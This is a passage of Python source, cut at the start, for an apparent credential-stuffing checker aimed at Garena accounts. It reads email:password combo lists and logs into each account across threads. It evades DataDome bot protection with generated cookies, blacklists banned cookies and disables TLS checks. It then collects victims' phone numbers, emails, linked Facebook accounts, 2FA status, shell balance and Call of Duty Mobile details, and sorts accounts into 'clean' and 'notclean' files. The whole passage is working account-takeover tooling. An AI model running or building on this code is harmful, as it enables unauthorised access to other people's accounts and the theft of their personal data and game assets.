    -> Login Country: {ipc}
    -> User Country: {details['personal']['country']}

->  ACCOUNT DETAILS:
    -> Garena Shells: {details['profile']['shell_balance']}
    -> Avatar URL: {safe_avatar}
    -> Mobile No: {details['personal']['mobile_no']}
    -> Email: {details['email']} ({'Verified' if details['email_verified'] else 'Not Verified'})
    -> Facebook Username: {details['security']['facebook_account'] or 'N/A'}

->  GAME INFO:
    -> {chr(10).join(game_info) if game_info else 'No game connections found'}
    -> {'' if not codm_info or codm_nickname == 'N/A' else f'''CODM: {codm_nickname} 🎮
    -> CODM Level: {codm_level}
    -> CODM UID: {codm_info.get('uid', 'N/A')}'''}

-> SECURITY STATUS:
    -> Mobile Bound: {'Yes' if details['personal']['mobile_no'] != 'N/A' else 'No'}
    -> Email Verified: {'Verified' if details['email_verified'] else 'Not Verified'}
    -> Facebook Linked: {'Yes' if details['security']['facebook_connected'] else 'No'}
    -> Authenticator: {'Enabled' if details['security']['authenticator_app'] else 'Disabled'}
    -> 2FA Enabled: {'Enabled' if details['security']['two_step_verify'] else 'Disabled'}
    -> Account Status: {'Clean' if details['is_clean'] else 'Bound'}

---------------------

""".strip()

    os.makedirs("output", exist_ok=True)

    current_date_file = datetime.now().strftime("%Y%m%d")
    output_file = os.path.join("output", f"{'clean' if details['is_clean'] else 'notclean'}_{current_date_file}.txt")


    def strip_ansi_codes(text):
        import re
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\$[0-?]*[ -/]*[@-~])')
        return ansi_escape.sub('', text)

    with open(output_file, "a", encoding="utf-8") as f:
        f.write(strip_ansi_codes(plain_output) + "\n\n")

    return output

def show_summary(counters, total_accounts, start_time):
    elapsed_time = time.time() - start_time
    print(f"\n{Fore.CYAN}{'='*50}")
    print(f"🛑 CHECKING INTERRUPTED - SUMMARY")
    print(f"{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}📊 Progress: {counters['checked_count']}/{total_accounts} accounts checked")
    print(f"{Fore.GREEN}✅ Valid Accounts: {counters['successful_count']}")
    print(f"{Fore.RED}❌ Invalid Accounts: {counters['failed_count']}")
    print(f"{Fore.GREEN}✨ Clean Accounts: {counters['clean_count']}")
    print(f"{Fore.RED}⛔ Not Clean Accounts: {counters['not_clean_count']}")
    print(f"{Fore.CYAN}⏰ Time Elapsed: {format_time_delta(elapsed_time)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")

def processaccount(session, account, password, cookie_manager, max_retries=3):
    for attempt in range(max_retries):
        try:
            logger.info(f"🔁 Processing {account} (attempt {attempt + 1}/{max_retries})")

            datadome = get_datadome_cookie(session)
            if not datadome:
                if attempt < max_retries - 1:
                    logger.warning(f"⚠️ Retrying {account} due to DataDome failure")
                    time.sleep(10)
                    continue
                return {"status": "failed", "message": f"❌ {account}: DataDome cookie generation failed"}
            session.cookies.set('datadome', datadome)

            v1, v2, new_datadome = prelogin(session, account)
            if not v1 or not v2:
                if attempt < max_retries - 1:
                    logger.warning(f"⚠️ Retrying {account} due to prelogin failure")
                    time.sleep(3)
                    continue
                return {"status": "failed", "message": f"❌ {account}: Invalid (Prelogin failed)"}
            if new_datadome:
                session.cookies.set('datadome', new_datadome)

            sso_key = login(session, account, password, v1, v2)
            if not sso_key:
                if attempt < max_retries - 1:
                    logger.warning(f"⚠️ Retrying {account} due to login failure")
                    time.sleep(3)
                    continue
                return {"status": "failed", "message": f"❌ {account}: Invalid (Login failed)"}
            session.cookies.set('sso_key', sso_key)

            headers = {
                'accept': '*/*',
                'cookie': f'sso_key={sso_key}',
                'referer': 'https://account.garena.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
            }


            init_url = "https://account.garena.com/api/account/init"
            init_response = session.get(init_url, headers=headers)


            if init_response.status_code == 403:
                logger.warning(f"❌ 403 Forbidden during account init for {account}")
                if attempt < max_retries - 1:
                    retry_delay = 10 * (attempt + 1)
                    logger.info(f"🕐 Retrying {account} in {retry_delay} seconds (403 Forbidden)...")
                    time.sleep(retry_delay)
                    session.cookies.clear()
                    continue
                else:
                    return {"status": "failed", "message": f"❌ {account}: Banned (403 Forbidden after {max_retries} attempts)"}


            if init_response.status_code == 403 or 'banned' in init_response.text.lower():
                logger.warning(f"⚠️ Banned account detected for {account}")
                if attempt < max_retries - 1:
                    logger.info(f"🕐 Retrying banned account check in 15 seconds...")
                    time.sleep(15)
                    continue

                current_cookie = get_fresh_cookie(session)
                if current_cookie:
                    cookie_manager.mark_banned(current_cookie)
                    logger.warning(f"⚠️ Banned cookie detected and blacklisted: {current_cookie[:50]}...")
                return {"status": "failed", "message": f"❌ {account}: Banned (Cookie flagged)"}

            account_data = init_response.json()

            if 'error' in account_data:
                if account_data.get('error') == 'error_auth':
                    return {"status": "failed", "message": f"⚠️ {account}: Invalid (Authentication error)"}
                return {"status": "failed", "message": f"⚠️ {account}: Error fetching details ({account_data['error']})"}

            if 'user_info' in account_data:
                details = parse_account_details(account_data)
            else:
                details = parse_account_details({'user_info': account_data})


            details['login_history'] = account_data.get("login_history", [])


            has_codm, codm_info = get_codm_info(session, account)
            details['has_codm'] = has_codm
            details['codm_info'] = codm_info


            game_info = get_game_connections(session, account)
            details['game_info'] = game_info


            # When running as an API, we don't write to local files directly
            # The loader will handle saving results.
            # with open('account_details.json', 'a', encoding='utf-8') as f:
            #     json.dump({
            #         'account': f"{account}:{password}",
            #         'details': details,
            #         'timestamp': time.time()
            #     }, f, ensure_ascii=False)
            #     f.write('\n')


            # Return structured data instead of formatted string
            return {
                "status": "success",
                "account": account,
                "password": password,
                "details": details,
                "codm_info": codm_info,
                "game_info": game_info,
                "is_clean": details['is_clean']
            }

        except Exception as e:
            logger.error(f"❌ Error processing {account}: {e}")
            if attempt < max_retries - 1:
                logger.warning(f"⚠️ Retrying {account} due to processing error")
                time.sleep(3)
                continue
            return {"status": "failed", "message": f"❌ {account}: Error ({str(e)})"}

    return {"status": "failed", "message": f"❌ {account}: Max retries exceeded"}

def get_fresh_cookie(session):

    try:
        cookies = session.cookies.get_dict()
        if 'sso_key' in cookies and 'datadome' in cookies:
            return f"sso_key={cookies['sso_key']}; datadome={cookies['datadome']}"
    except:
        pass
    return None

def find_nearest_account_file():
    # This function is not relevant for the API, as the loader will provide the accounts
    return None

def format_time_delta(seconds):

    if seconds < 60:
        return f"{int(seconds)}s"
    elif seconds < 3600:
        minutes = int(seconds // 60)
        secs = int(seconds % 60)
        return f"{minutes}m {secs}s"
    else:
        hours = int(seconds // 3600)
        minutes = int((seconds % 3600) // 60)
        return f"{hours}h {minutes}m"

def restart():
    # Not relevant for the API
    pass

# The main function is now a callable checker function
def run_checker_api(accounts_list, num_threads=1):
    results = []
    cookie_manager = CookieManager()

    def process_combo_wrapper(combo):
        account, password = combo.split(':', 1)
        session = requests.Session()
        session.verify = False
        requests.packages.urllib3.disable_warnings()

        valid_cookie = cookie_manager.get_valid_cookie()
        if valid_cookie:
            applyck(session, valid_cookie)

        result = processaccount(session, account, password, cookie_manager, max_retries=3)
        session.close()
        return result

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        results = list(executor.map(process_combo_wrapper, accounts_list))

    return results
